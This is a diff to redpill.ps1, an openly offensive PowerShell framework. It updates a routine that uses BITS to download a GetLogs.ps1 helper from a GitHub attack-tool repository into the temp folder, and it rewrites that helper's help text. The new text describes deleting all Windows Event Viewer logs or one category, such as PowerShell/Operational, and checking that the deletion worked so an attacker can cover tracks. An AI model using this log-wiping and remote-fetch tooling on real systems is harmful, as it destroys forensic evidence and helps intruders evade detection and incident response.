@@ -643,7 +643,7 @@ If($NewEst -lt "1"){$NewEst = "3"} ## Set the min logs to display
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/GetLogs.ps1 -Destination $Env:TMP\GetLogs.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\GetLogs.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 26){## Corrupted download detected => DefaultFileSize: 26,3056640625/KB
+      If($SizeDump -lt 26){## Corrupted download detected => DefaultFileSize: 26,669921875/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\GetLogs.ps1"){Remove-Item -Path "$Env:TMP\GetLogs.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -2955,22 +2955,22 @@ $HelpParameters = @"
    <#!Help.
    .SYNOPSIS
       Author: @r00t-3xp10it
-      Helper - Enumerate\Read\Clear eventvwr logfiles!
+      Helper - Enumerate\Read\DeleteAll eventvwr logfiles!
 
    .DESCRIPTION
-      This cmdlet displays a list of ALL eventvwr categorie entrys and there
-      indevidual logfiles counter, it also list logfiles on categories sutch as:
-      'Windows Powershell', 'PowerShell/Operational', 'Bits-Client/Operacional'
-      on -GetLogs "verbose" mode, and displays the contents of logfiles based
-      on there ID number if sellected -GetLogs "Yara" parameter!
+      This cmdlet allow users to delete ALL eventvwr logfiles or to delete
+      all of the logfiles from the sellected categorie { -verb 'event path' }.
+      It also enumerates major categories logfiles counter { -GetLogs 'Enum' }
+      to help attacker identify if the logs have been successfuly deleted. To
+      further forensics investigation we can use the { -GetLogs 'yara' } @arg
+      that allow users to display the contents of the sellected logfiles.
 
    .NOTES
       Required Dependencies: wevtutil {native}
-      The Clear @argument requires administrator privileges!
       To list multiple Id's then split the numbers by a [,] char!
       Example: .\GetLogs.ps1 -GetLogs Yara -Id "59,60,300,400,8002"
-      If none ID or VERB paramets are used together with 'YARA' @argument,
-      then this cmdlet will scan pre-defined event paths and ID's numbers!
+      If none -ID or -VERB paramets are used together with 'YARA' @argument,
+      then this cmdlet will start scan pre-defined event paths and ID's numbers!
 
    .Parameter GetLogs
       Accepts argument: Enum, Verbose, Yara, DeleteAll
@@ -2979,14 +2979,14 @@ $HelpParameters = @"
       How many event logs to display int value (default: 3)
 
    .Parameter Id
-      List logfiles by is EventID number!
+      List logfiles by is EventID number identifier!
 
    .Parameter Verb
-      Accepts 'ONE' Eventvwr registry path to be scanned! 
+      Accepts 'ONE' Eventvwr path to be scanned\Deleted! 
 
    .EXAMPLE
       PS C:\> .\redpill.ps1 -GetLogs Enum
-      Lists ALL eventvwr categorie entrys
+      Lists Major eventvwr categorie entrys
 
    .EXAMPLE
       PS C:\> .\redpill.ps1 -GetLogs Verbose
@@ -3014,11 +3014,11 @@ $HelpParameters = @"
 
    .EXAMPLE
       PS C:\> .\redpill.ps1 -GetLogs DeleteAll
-      Remark: Clear function requires Administrator privileges!
+      Delete ALL eventvwr (categories) logs from snapIn!
 
    .EXAMPLE
       PS C:\> .\redpill.ps1 -GetLogs DeleteAll -Verb "Microsoft-Windows-Powershell/Operational"
-      Delete only logfiles from "Microsoft-Windows-Powershell/Operational" eventvwr categorie!
+      Delete ONLY logfiles from "Microsoft-Windows-Powershell/Operational" eventvwr categorie!
 
    .OUTPUTS
       LogMode  MaximumSizeInBytes RecordCount LogName
